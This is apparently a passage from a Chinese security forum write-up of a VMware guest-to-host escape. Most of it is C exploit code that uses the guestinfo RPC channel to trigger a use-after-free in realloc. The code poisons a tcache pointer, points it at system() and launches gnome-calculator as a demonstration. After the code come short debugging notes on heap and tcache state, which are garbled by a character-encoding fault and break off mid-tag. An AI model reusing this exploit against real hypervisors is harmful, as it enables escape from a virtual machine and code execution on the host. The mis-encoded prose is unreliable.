BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFE0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token comment">//run_cmd(s1);</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span>s1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this time free firstly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"already free check the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"alloc for channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"free agin for UAF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"UAF done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ready to change fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hjacking!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"target address in fd\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="0x03-è°ƒè¯•"><a href="#0x03-è°ƒè¯•" class="headerlink" title="0x03 è°ƒè¯•"></a>0x03 è°ƒè¯•</h2><p>æŠŠæ–­ç‚¹æ”¾åœ¨reallocçš„ä½ç½®ï¼Œæ–¹ä¾¿æŸ¥çœ‹reallocåçš„å †å¸ƒå±€ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c15bb21f3a9a8d61cee8d1679228e3378e2a5c53.png" alt="å›¾ç‰‡.png"></p><p>åœ¨ç¬¬ä¸€æ¬¡freeçš„ä½ç½®çœ‹åˆ°äº†ç›®æ ‡chunkï¼Œ<code>0x7f797803a890</code>ï¼Œè¿™ä¸ªchunkå°±æ˜¯æˆ‘ä»¬è¦å¤ç”¨çš„chunkã€‚æ­¤æ¬¡reallocç»“æŸï¼Œåº”è¯¥è¢«æŒ‚è¿›tcacheã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5f6609f03fbf2c05e9a32233dda512666ac8401a.png" alt="å›¾ç‰‡.png"></p><p>æ•´ä¸ªchunkçš„å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°å¤§å°æ˜¯0x115ï¼Œè¿™é‡Œä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿åœ°å€éƒ½æ²¡å¯¹é½ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-558cbd15fff8d78e9d81193abbc1855318dc2976.png" alt="å›¾ç‰‡.png"></p><p>å•æ­¥æ‰§è¡Œä¹‹åï¼Œçœ‹åˆ°è¢«æŒ‚è¿›tcacheçš„chunkã€‚å½“channel 1ï¼Œallocå–å‡ºè¿™å—chunkçš„æ—¶å€™ï¼Œæ²¡æœ‰è§¦å‘åˆ°reallocï¼Œç›´æ¥èµ°è¿‡å»äº†ã€‚æ‰€ä»¥æ²¡æ–­ä¸‹æ¥ã€‚å› è¯¥åœ¨ifçš„åˆ¤æ–­ä½ç½®åŠ ä¸€ä¸ªæ–­ç‚¹ï¼ŒæŸ¥çœ‹å †å¸ƒå±€çš„ã€‚</p><p>ä¸è¿‡æ­¤æ—¶å¯ä»¥çœ‹ä¸€ä¸‹ç›®æ ‡chunkçš„å†…å®¹ï¼Œæœ‰æ²¡æœ‰è¢«æ”¹å˜ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-af593aa4f5b88482d210904f17b6bbbdca1fff56.png" alt="å›¾ç‰‡.png"></p><p>å¯ä»¥çœ‹åˆ°è¢«æŒ‚ä¸Šäº†ç†Ÿæ‚‰çš„fdï¼Œä½†æ˜¯å´æ²¡æœ‰åœ¨ç›¸åº”çš„tcacheé‡Œé¢ï¼Œåˆ™å¯ä»¥æ¨æ–­ï¼Œè¯¥chunkå·²ç»æ˜¯allocçŠ¶æ€äº†ã€‚</p><p>ç»§ç»­æ‰§è¡Œï¼Œç¬¬äºŒæ¬¡freeã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf83f7ba2ba709b640e4e31c373f2f4ce8374f6e.png" alt="å›¾ç‰‡.png"></p><p>æ­¤æ¬¡reallocä¾ç„¶è§¦å‘freeã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-90ca8fba0d3563f28628ce7e637ba491a0af2167.png" 